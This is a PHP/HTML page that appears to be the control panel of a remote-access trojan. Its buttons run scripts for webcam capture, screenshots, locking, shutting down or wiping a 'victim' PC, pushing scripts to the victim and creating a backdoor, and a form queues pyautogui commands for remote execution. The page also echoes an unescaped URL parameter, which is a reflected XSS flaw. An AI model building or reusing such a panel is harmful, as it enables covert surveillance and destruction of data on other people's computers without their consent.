<?php  
include("includes/header2.php");
?>


<!DOCTYPE html>
<html>
<head>
<title>controller</title>
<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
<link rel="stylesheet" href="./style.css">
</head>
<body >
<div class="container-fluid">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <h1 id="blink" class="page-heading">COMMANDS</h1>
            </div>
            <div class="col-lg-6 section">
                <div class="row">
                   
                    <div class="col-lg-12 text-center">
                        <h1  class="page-heading">Communication for client</h1>
                        <br><br>
                       <a  href="codes\try\try0.php"><button type="button"  class="btn btn-outline-danger">try0</button></a> 
                       <a  href="codes\try\try1.php"><button type="button"  class="btn btn-outline-danger">try1</button></a> 
                       <a  href="codes\try\try2.php"><button type="button"  class="btn btn-outline-danger">try2</button></a> 
                       <a  href="codes\try\try3.php"><button type="button"  class="btn btn-outline-danger">try3</button></a> 
                       <a  href="codes\try\try4.php"><button type="button"  class="btn btn-outline-danger">try4</button></a> 
                       <a  href="codes\try\try5.php"><button type="button"  class="btn btn-outline-danger">try5</button></a> 
                       <a  href="codes\try\try6.php"><button type="button"  class="btn btn-outline-danger">try6</button></a> 
                       <a  href="codes\try\try7.php"><button type="button"  class="btn btn-outline-danger">try7</button></a> 
                      
                
                       
                    </div>
                    <div class="col-lg-12 text-center">
                        <br><br>
                       <a  href="./SAM.HTML"><button type="button"  class="btn btn-outline-danger">try0</button></a> 
                        <button type="button" class="btn btn-outline-danger">Try 0</button>
                        <button type="button" class="btn btn-outline-danger">Try 1</button>
                        <button type="button" class="btn btn-outline-danger">Try 2</button>
                        <button type="button" class="btn btn-outline-danger">Try 3</button>
                        <button type="button" class="btn btn-outline-danger">Try 4</button>
                        <button type="button" class="btn btn-outline-danger">Try 5</button>
                       
                    </div>
                    <div class="col-lg-12 text-center">
                        <br><br>
                       <a  href="./SAM.HTML"><button type="button"  class="btn btn-outline-danger">try0</button></a> 
                        <button type="button" class="btn btn-outline-danger">Try 0</button>
                        <button type="button" class="btn btn-outline-danger">Try 1</button>
                        <button type="button" class="btn btn-outline-danger">Try 2</button>
                        <button type="button" class="btn btn-outline-danger">Try 3</button>
                        <button type="button" class="btn btn-outline-danger">Try 4</button>
                        <button type="button" class="btn btn-outline-danger">Try 5</button>
                       
                    </div>
                   
                </div>
            </div>
            <div class="col-lg-6 section">
                <div class="row">
                   
                    <div class="col-lg-12 text-center">
                        <h1  class="page-heading">Commands For Servers</h1>
                        <br><br>
                       <a  href="codes\sessions\sessions.php"><button type="button"  class="btn btn-outline-danger">sessions</button></a> 
                       <a  href="codes\mypc.php"><button type="button"  class="btn btn-outline-danger">Server</button></a>
                       <a  href="codes\scrshot.php"><button type="button"  class="btn btn-outline-danger">ScreenShot</button></a>
                       <a  href="codes\webcamera.php"><button type="button"  class="btn btn-outline-danger">webcamera</button></a>
                       <a  href="codes\server\server.php"><button type="button"  class="btn btn-outline-danger">Main Server</button></a>
                       <a  href="codes\server\kill.php"><button type="button"  class="btn btn-outline-danger">Kill Main Server</button></a>
                       
                       
                    </div>
                    <div class="col-lg-12 text-center">
                        <br><br>
                        

                        <a  href="codes\Remote\try0.php"><button type="button"  class="btn btn-outline-danger">Remote Server</button></a>
                        <a  href="codes\Remote\kill.php"><button type="button"  class="btn btn-outline-danger">Kill Remote Server</button></a>
                        <a  href="codes\bck\bck.php"><button type="button"  class="btn btn-outline-danger">Back</button></a>
                        <a  href="codes\deleverything\try0.php"><button type="button"  class="btn btn-outline-danger">Del Everything</button></a>
                        <a  href="codes\kill\kill.php"><button type="button"  class="btn btn-outline-danger">Kill Communication With Victim</button></a>
                        <a  href="codes\lock.php"><button type="button"  class="btn btn-outline-danger">Lock PC</button></a>
                        <a  href="codes\swapmouse.php"><button type="button"  class="btn btn-outline-danger">Swap Mouse Click</button></a>
                        <a  href="codes\alert.php"><button type="button"  class="btn btn-outline-danger">Alert Msg</button></a>
                        <a  href="codes\shutdown.php"><button type="button"  class="btn btn-outline-danger">Shut_Down</button></a>
                        <a  href="codes\closetask.php"><button type="button"  class="btn btn-outline-danger">Close Active Task</button></a>
                        <a  href="codes\full.php"><button type="button"  class="btn btn-outline-danger">Full Screen Server</button></a>
                        
                       
                    </div>
                    <div class="col-lg-12 text-center">
                        <br><br>

                       

                       
                    </div>
                    
                </div>
            </div>
            <div class="back-button"><div class="col-lg-12 text-center">




            </div></div>
                           <div class="back-button"><div class="col-lg-12 text-center">
                           <br><br>
                                <a  href="database/add.php"><button type="button"  class="btn btn-outline-danger">Create Database on server</button></a> 
                            
                               <a  href="database/del.php"><button type="button"  class="btn btn-outline-danger">Delete Database on server</button></a> 
                            </div></div>

            <div class="back-button"><div class="col-lg-12 text-center">
              
                          
                        <form action="post_comment.php" method="post"><br><br><br>
                        <table>
                            
                               
                                <input style="color: #12ff26; width: 221px;height: 30px; background-color:black;  border-color: #12ff26;" type="" name="name" placeholder="Please enter your name"></td>
                            
                            
                                <br><br>
                               
                                <textarea style="background-color:black; color: #12ff26; border-color: #12ff26; " name="comment" rows="5" cols="80" >import pyautogui     
pyautogui.write("srt")    
pyautogui.press("enter")
                                </textarea>
                                
                                <br><br>
                            
                                
                                <input style="width: 230px;height: 40px; background-color:black;  border-color: #12ff26; color: #12ff26;" type="submit" name="submit" value="Send to Data Base"></td>
                            
                        </table>
                    </form>
                    <br>
                    <br>
                    </div>

                            <div class="back-button"><div class="col-lg-12 text-center">
                                
                               <a  href="database/send.php"><button type="button"  class="btn btn-outline-danger">Send Script To server</button></a> 
                               <a  href="database/execute.php"><button type="button"  class="btn btn-outline-danger">Send Script To Victim</button></a> 
                            
                            </div></div>
                            <div class="row">
                   
                   <div class="col-lg-12 text-center">
                       <h1  class="page-heading">Create a Backdoor</h1>
                       <a  href="#"><button type="button"  class="btn btn-outline-danger">Create a Backdoor</button></a> 
                       <h1> wait for upload backdoor in server</h1>
                       
                              
                       <br><br>
                      
                      
                   </div>

              
              
              
          </div></div>
        </div>

        <br>
       
<script type="text/javascript">
    var blink = document.getElementById('blink');
    setInterval(function() {
        blink.style.opacity = (blink.style.opacity == 0 ? 1 : 0);
    }, 1500);
</script>











<?php 
	include_once 'database/controllers/Comment.php';
	$com = new Comment();
 ?>

 	
 </head>
 <body style="background-color:black;">
 	
 		<?php 
 			if (isset($_GET['msg'])) {
 				$msg = $_GET['msg'];
 				echo "<span style='color:green;font-size:20px'>".$msg."</span>";
 			}
 		 ?>
 	
 	
 